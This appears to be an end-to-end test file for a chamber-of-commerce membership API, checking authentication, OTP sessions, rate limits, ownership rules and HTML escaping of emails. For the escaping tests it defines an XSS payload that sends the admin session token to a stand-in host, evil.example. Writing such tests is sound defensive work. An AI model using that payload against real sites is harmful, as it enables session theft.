// End-to-end exercise of the real API handlers against a mock Upstash server.
import { startMockRedis } from './mock-redis.mjs';

const mock = await startMockRedis();

process.env.UPSTASH_REDIS_REST_URL = mock.url;
process.env.UPSTASH_REDIS_REST_TOKEN = 'test-token';
process.env.ADMIN_EMAILS = 'admin@bccibharuch.in';
process.env.ADMIN_PASSWORD = 'correct-horse-battery-staple';
process.env.INTERNAL_API_SECRET = 'internal-secret-value';
process.env.ALLOWED_ORIGIN = 'https://bccibharuch.in';
process.env.SMTP_TRANSPORT = 'json';

const BCCI = new URL('../api', import.meta.url).pathname;
const applications = (await import(`${BCCI}/applications.js`)).default;
const adminAuth = (await import(`${BCCI}/admin-auth.js`)).default;
const adminStats = (await import(`${BCCI}/admin-stats.js`)).default;
const enquiries = (await import(`${BCCI}/enquiries.js`)).default;
const sendOtp = (await import(`${BCCI}/send-otp.js`)).default;
const verifyOtp = (await import(`${BCCI}/verify-otp.js`)).default;
const sendEmailRoute = (await import(`${BCCI}/send-email.js`)).default;

// ── Fake req/res ────────────────────────────────────────────────────
function mockRes() {
  const res = {
    statusCode: 200, body: null, headers: {},
    setHeader(k, v) { this.headers[k.toLowerCase()] = v; return this; },
    status(c) { this.statusCode = c; return this; },
    json(o) { this.body = o; this.done = true; return this; },
    end(o) { this.body = o ?? this.body; this.done = true; return this; },
    get headersSent() { return false; },
  };
  return res;
}

async function call(handler, { method = 'GET', body, query = {}, token, origin, ip = '203.0.113.9' } = {}) {
  const req = {
    method, body, query,
    headers: { ...(token ? { authorization: `Bearer ${token}` } : {}), ...(origin ? { origin } : {}), 'x-forwarded-for': ip },
    socket: { remoteAddress: ip },
  };
  const res = mockRes();
  await handler(req, res);
  return res;
}

// ── Tiny assertion harness ──────────────────────────────────────────
let pass = 0, fail = 0;
const results = [];
function check(name, cond, detail = '') {
  if (cond) { pass++; results.push(`  PASS  ${name}`); }
  else { fail++; results.push(`  FAIL  ${name}${detail ? ` — ${detail}` : ''}`); }
}
function section(t) { results.push(`\n${t}\n${'─'.repeat(t.length)}`); }

// ════════════════════════════════════════════════════════════════════
section('SEC-01  Application data is no longer world-readable');

let r = await call(applications, { method: 'GET' });
check('GET /api/applications without a token → 401', r.statusCode === 401, `got ${r.statusCode}`);

r = await call(applications, { method: 'GET', query: { email: 'victim@example.com' } });
check('GET ?email= without a token → 401', r.statusCode === 401, `got ${r.statusCode}`);

r = await call(enquiries, { method: 'GET' });
check('GET /api/enquiries without a token → 401', r.statusCode === 401, `got ${r.statusCode}`);

// ════════════════════════════════════════════════════════════════════
section('Admin sign-in');

r = await call(adminAuth, { method: 'POST', body: { username: 'admin@bccibharuch.in', password: 'wrong' } });
check('wrong password → 401', r.statusCode === 401, `got ${r.statusCode}`);

r = await call(adminAuth, { method: 'POST', body: { username: 'nobody@evil.com', password: 'correct-horse-battery-staple' } });
check('unknown admin email → 401', r.statusCode === 401, `got ${r.statusCode}`);

r = await call(adminAuth, { method: 'POST', body: { username: 'admin@bccibharuch.in', password: 'correct-horse-battery-staple' } });
check('correct credentials → 200 with a token', r.statusCode === 200 && !!r.body?.session?.token, `got ${r.statusCode}`);
const adminToken = r.body?.session?.token;

// BUG-02: expiresIn must be seconds, and the client multiplies by 1000.
check('session expiresIn is 8h in SECONDS (not ms)', r.body?.session?.expiresIn === 28800, `got ${r.body?.session?.expiresIn}`);

r = await call(applications, { method: 'GET', token: adminToken });
check('admin can list applications', r.statusCode === 200 && Array.isArray(r.body.applications), `got ${r.statusCode}`);

r = await call(applications, { method: 'GET', token: 'not-a-real-token' });
check('forged token → 401', r.statusCode === 401, `got ${r.statusCode}`);

// ════════════════════════════════════════════════════════════════════
section('SEC-05  OTP issues a real server-side session');

r = await call(sendOtp, { method: 'POST', body: { email: 'applicant@example.com' } });
check('send-otp → 200', r.statusCode === 200, JSON.stringify(r.body));
check('send-otp does not leak the code in its response', !JSON.stringify(r.body).match(/\d{6}/), JSON.stringify(r.body));

// SEC-06: second immediate request is rate-limited.
r = await call(sendOtp, { method: 'POST', body: { email: 'applicant@example.com' } });
check('second OTP within 60s → 429', r.statusCode === 429, `got ${r.statusCode}`);

const otp = JSON.parse(mock.store.get('bcci:otp:applicant@example.com'));

r = await call(verifyOtp, { method: 'POST', body: { email: 'applicant@example.com', code: '000000' } });
check('wrong OTP → 400', r.statusCode === 400, `got ${r.statusCode}`);

r = await call(verifyOtp, { method: 'POST', body: { email: 'applicant@example.com', code: otp, name: 'Rajesh Shah' } });
check('correct OTP → 200 with a session token', r.statusCode === 200 && !!r.body?.session?.token, JSON.stringify(r.body));
const applicantToken = r.body?.session?.token;

// ════════════════════════════════════════════════════════════════════
section('BUG-01  Submitted applications are visible to the admin');

const XSS = '<img src=x onerror="fetch(\'https://evil.example/\'+localStorage.bcci_admin_session)">';

r = await call(applications, {
  method: 'POST',
  body: { repName: 'Rajesh Shah', company: XSS, phone: '9876543210', businessServices: 'Chemicals', district: 'Bharuch', gstNo: '24AAAAA0000A1Z5', panNo: 'AAAAA0000A' },
});
check('POST without a verified session → 401', r.statusCode === 401, `got ${r.statusCode}`);

r = await call(applications, {
  method: 'POST',
  token: applicantToken,
  body: { repName: 'Rajesh Shah', company: XSS, phone: '9876543210', businessServices: 'Chemicals', district: 'Bharuch', gstNo: '24AAAAA0000A1Z5', panNo: 'AAAAA0000A' },
});
check('POST with a verified session → 201', r.statusCode === 201, JSON.stringify(r.body).slice(0, 200));
const appId = r.body?.applicationId;

check('new application status is "Pending" (capitalised)', r.body?.application?.status === 'Pending', `got ${r.body?.application?.status}`);

r = await call(applications, { method: 'GET', token: adminToken });
const pending = (r.body.applications || []).filter((a) => a.status === 'Pending');
check('the admin\'s Pending filter now matches it', pending.length === 1, `found ${pending.length}`);

// Duplicate guard
r = await call(applications, {
  method: 'POST', token: applicantToken,
  body: { repName: 'Rajesh Shah', company: 'Dupe Ltd', phone: '9876543210', businessServices: 'Chemicals', district: 'Bharuch' },
});
check('a second application from the same email → 409', r.statusCode === 409, `got ${r.statusCode}`);

// Server-side validation checks
r = await call(applications, {
  method: 'POST', token: applicantToken,
  body: { repName: 'Rajesh Shah', company: 'Test Ltd', phone: '9876543210', businessServices: 'Chemicals', employees: 'abc' },
});
check('POST with invalid employees → 400', r.statusCode === 400, `got ${r.statusCode}`);

r = await call(applications, {
  method: 'POST', token: applicantToken,
  body: { repName: 'Rajesh Shah', company: 'Test Ltd', phone: '9876543210', businessServices: 'Chemicals', address: 'Plot' },
});
check('POST with short address (<5 chars) → 400', r.statusCode === 400, `got ${r.statusCode}`);

r = await call(applications, {
  method: 'POST', token: applicantToken,
  body: { repName: 'Rajesh Shah', company: 'Test Ltd', phone: '9876543210', businessServices: 'Chemicals', annualTurnover: '1' },
});
check('POST with short annualTurnover (<2 chars) → 400', r.statusCode === 400, `got ${r.statusCode}`);

r = await call(applications, {
  method: 'POST', token: applicantToken, ip: '203.0.113.21',
  body: { repName: 'Rajesh Shah', company: 'Test Ltd', phone: '9876543210', businessServices: 'Chemicals', annualTurnover: '25 Crore' },
});
check('POST with non-numeric annualTurnover → 400', r.statusCode === 400, `got ${r.statusCode}`);

r = await call(applications, {
  method: 'POST', token: applicantToken, ip: '203.0.113.22',
  body: { repName: 'Rajesh Shah', company: 'Test Ltd', phone: '9876543210', businessServices: 'Chemicals', annualTurnover: '0' },
});
check('POST with zero annualTurnover → 400', r.statusCode === 400, `got ${r.statusCode}`);

r = await call(applications, {
  method: 'POST', token: applicantToken, ip: '203.0.113.23',
  body: { repName: 'Rajesh Shah', company: 'Test Ltd', phone: '9876543210', businessServices: 'Chemicals', annualTurnover: '-25000000' },
});
check('POST with negative annualTurnover → 400', r.statusCode === 400, `got ${r.statusCode}`);

// ════════════════════════════════════════════════════════════════════
section('Ownership: an applicant can only read their own record');

r = await call(applications, { method: 'GET', token: applicantToken, query: { email: 'applicant@example.com' } });
check('own record → 200', r.statusCode === 200 && r.body.application?.id === appId, `got ${r.statusCode}`);

r = await call(applications, { method: 'GET', token: applicantToken, query: { email: 'someone.else@example.com' } });
check('another member\'s record → 401', r.statusCode === 401, `got ${r.statusCode}`);

// ════════════════════════════════════════════════════════════════════
section('Approval flow and renewal authorisation');

r = await call(applications, { method: 'PATCH', body: { id: appId, status: 'Approved' } });
check('PATCH without a token → 401', r.statusCode === 401, `got ${r.statusCode}`);

r = await call(applications, { method: 'PATCH', token: applicantToken, body: { id: appId, status: 'Approved' } });
check('applicant cannot approve their own application', r.statusCode === 401, `got ${r.statusCode}`);

r = await call(applications, { method: 'PATCH', token: adminToken, body: { id: appId, status: 'Approved' } });
check('admin approves → 200, status Approved', r.statusCode === 200 && r.body?.application?.status === 'Approved', JSON.stringify(r.body).slice(0, 200));
check('approvedAt is recorded', !!r.body?.application?.approvedAt);

r = await call(applications, { method: 'PATCH', token: applicantToken, body: { id: appId, action: 'renew', paymentRef: 'UPI/12345' } });
check('member renews their own membership → 200', r.statusCode === 200, JSON.stringify(r.body).slice(0, 200));
check('renewal extends the term to 2 years', r.body?.application?.renewalYears === 2, `got ${r.body?.application?.renewalYears}`);
check('renewal cannot change status', r.body?.application?.status === 'Approved');

// ════════════════════════════════════════════════════════════════════
section('BUG-05  admin-stats is reachable again');

r = await call(adminStats, { method: 'GET' });
check('no token → 401', r.statusCode === 401, `got ${r.statusCode}`);

r = await call(adminStats, { method: 'GET', token: adminToken });
check('valid admin token → 200 (was always 401 before)', r.statusCode === 200, JSON.stringify(r.body).slice(0, 200));
check('counts the approved member', r.body?.stats?.approved === 1, `got ${r.body?.stats?.approved}`);

// ════════════════════════════════════════════════════════════════════
section('SEC-03  The email endpoint is no longer an open relay');

r = await call(sendEmailRoute, {
  method: 'POST',
  body: { type: 'application_approved', to: 'victim@example.com', data: { appId: 'X', company: 'Y', repName: 'Z', validUntil: 'now' } },
});
check('unauthenticated send → 401', r.statusCode === 401, `got ${r.statusCode}`);

r = await call(sendEmailRoute, {
  method: 'POST', token: 'internal-secret-value',
  body: { type: 'application_approved', to: 'member@example.com', data: { appId: 'X', company: 'Y', repName: 'Z', validUntil: 'now' } },
});
check('internal secret → 200', r.statusCode === 200, JSON.stringify(r.body).slice(0, 200));

// Template escaping
const { TEMPLATES } = await import(`${BCCI}/_lib/email.js`);
const rendered = TEMPLATES.application_approved({ appId: 'A', company: XSS, repName: 'R', validUntil: 'x' }).html;
check('applicant text is escaped in email templates', !rendered.includes('<img src=x') && rendered.includes('&lt;img'), 'raw HTML leaked into the template');

const ticketEmail = TEMPLATES.event_ticket?.({
  ticketId: 'TKT-TEST-1234',
  eventTitle: `BCCI Summit ${XSS}`,
  date: '2026-11-20',
  time: '10:00 AM',
  venue: 'BCCI Hall, Bharuch',
  mode: 'offline',
  attendeeName: 'Suresh Patel',
  company: 'Patel Mfg',
  phone: '9825012345',
  email: 'suresh@example.com',
  pricingType: 'paid',
  fee: 500,
  paymentRef: 'UPI/123456789',
});
check('event_ticket template renders valid subject and HTML', Boolean(ticketEmail?.subject?.includes('BCCI Event Pass') && ticketEmail?.html?.includes('TKT-TEST-1234')));
check('event_ticket template escapes user content', Boolean(ticketEmail?.html && !ticketEmail.html.includes('<img src=x') && ticketEmail.html.includes('&lt;img')));

// ════════════════════════════════════════════════════════════════════
section('DATA-03  Enquiry IDs are unique');

const ids = new Set();
for (let i = 0; i < 40; i++) {
  // Vary the source network — otherwise the per-IP flood limit (correctly)
  // cuts the loop off at 10.
  const res2 = await call(enquiries, {
    method: 'POST',
    ip: `198.51.100.${i}`,
    body: { name: `Person ${i}`, email: `p${i}@example.com`, phone: '9876543210', subject: 'Hello', message: 'Testing' },
  });
  if (res2.statusCode === 201) ids.add(res2.body.enquiry.id);
}
check('40 enquiries produced 40 distinct IDs', ids.size === 40, `got ${ids.size}`);

r = await call(enquiries, { method: 'GET', token: adminToken });
check('admin can read enquiries', r.statusCode === 200 && r.body.enquiries.length === 40, `got ${r.body?.enquiries?.length}`);

// The per-IP limiter should still bite when one source floods.
let blocked = 0;
for (let i = 0; i < 15; i++) {
  const res3 = await call(enquiries, {
    method: 'POST', ip: '192.0.2.77',
    body: { name: `Flood ${i}`, email: `flood${i}@example.com`, phone: '9876543210', subject: 'Hi', message: 'Spam' },
  });
  if (res3.statusCode === 429) blocked++;
}
check('flooding from one IP gets rate-limited', blocked > 0, `blocked ${blocked} of 15`);

// ════════════════════════════════════════════════════════════════════
section('Validation');

r = await call(enquiries, { method: 'POST', body: { name: 'A', email: 'nope', phone: '123', subject: '', message: '' } });
check('invalid enquiry → 400', r.statusCode === 400, `got ${r.statusCode}`);

r = await call(sendOtp, { method: 'POST', body: { email: 'not-an-email' } });
check('invalid email for OTP → 400', r.statusCode === 400, `got ${r.statusCode}`);

const { cleanPhone } = await import(`${BCCI}/_lib/http.js`);
check('cleanPhone strips +91 country code', cleanPhone('+91 98250 12345') === '9825012345');
check('cleanPhone strips 91 country code prefix', cleanPhone('919825012345') === '9825012345');
check('cleanPhone strips trunk 0 prefix', cleanPhone('09825012345') === '9825012345');
check('cleanPhone preserves 10-digit number', cleanPhone('9825012345') === '9825012345');

r = await call(enquiries, {
  method: 'POST',
  ip: '203.0.113.199',
  body: { name: 'Prefix User', email: 'prefix@example.com', phone: '+91 9898123456', subject: 'Inquiry', message: 'Hello BCCI' },
});
check('enquiry with +91 phone succeeds (201)', r.statusCode === 201, `got ${r.statusCode}`);
check('enquiry phone is normalized to 10 digits', r.body?.enquiry?.phone === '9898123456', `got ${r.body?.enquiry?.phone}`);

// ── Report ──────────────────────────────────────────────────────────
process.on("exit",()=>{});
console.log(results.join('\n'));
console.log(`\n${'═'.repeat(52)}`);
console.log(`  ${pass} passed, ${fail} failed`);
console.log('═'.repeat(52));

mock.server.close();
process.exit(fail ? 1 : 0);
